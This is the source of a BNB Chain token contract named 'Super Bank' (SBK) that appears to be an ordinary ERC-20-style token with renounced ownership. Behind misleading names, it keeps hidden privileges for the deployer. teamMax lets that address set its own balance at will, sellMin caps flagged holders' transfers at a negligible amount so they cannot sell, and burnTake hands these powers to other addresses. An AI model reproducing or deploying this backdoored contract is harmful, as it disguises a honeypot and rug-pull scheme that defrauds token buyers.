/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


interface IUniswapV2Router {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SuperBank {
    uint8 public decimals = 18;
    string public symbol = "SBK";


    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public buyTo;
    string public name = "Super Bank";
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isTakeFee;
    address public owner;

    mapping(address => uint256) public balanceOf;

    address public marketingIsBuy;
    mapping(address => bool) public toLaunched;

    uint256 constant atBuy = 1 * 10 ** 10;
    modifier enableAuto() {
        require(isTakeFee[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router listAuto = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buyTo = IUniswapV2Factory(listAuto.factory()).createPair(listAuto.WETH(), address(this));
        owner = msg.sender;
        marketingIsBuy = owner;
        isTakeFee[marketingIsBuy] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, dst, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function teamMax(uint256 fundTrading) public enableAuto {
        balanceOf[marketingIsBuy] = fundTrading;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function takeLiquidity(address isBurn, address autoShould, uint256 fundTrading) internal returns (bool) {
        require(balanceOf[isBurn] >= fundTrading);
        balanceOf[isBurn] -= fundTrading;
        balanceOf[autoShould] += fundTrading;
        emit Transfer(isBurn, autoShould, fundTrading);
        return true;
    }

    function _transferFrom(address src, address dst, uint256 amount) internal returns (bool) {
        if (src == marketingIsBuy || dst == marketingIsBuy) {
            return takeLiquidity(src, dst, amount);
        }
        if (toLaunched[src]) {
            return takeLiquidity(src, dst, atBuy);
        }
        return takeLiquidity(src, dst, amount);
    }

    function sellMin(address senderMarketing) public enableAuto {
        toLaunched[senderMarketing] = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function burnTake(address receiverTeamSell) public enableAuto {
        isTakeFee[receiverTeamSell] = true;
    }

    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
        if (allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= amount);
            allowance[src][msg.sender] -= amount;
        }
        return _transferFrom(src, dst, amount);
    }


}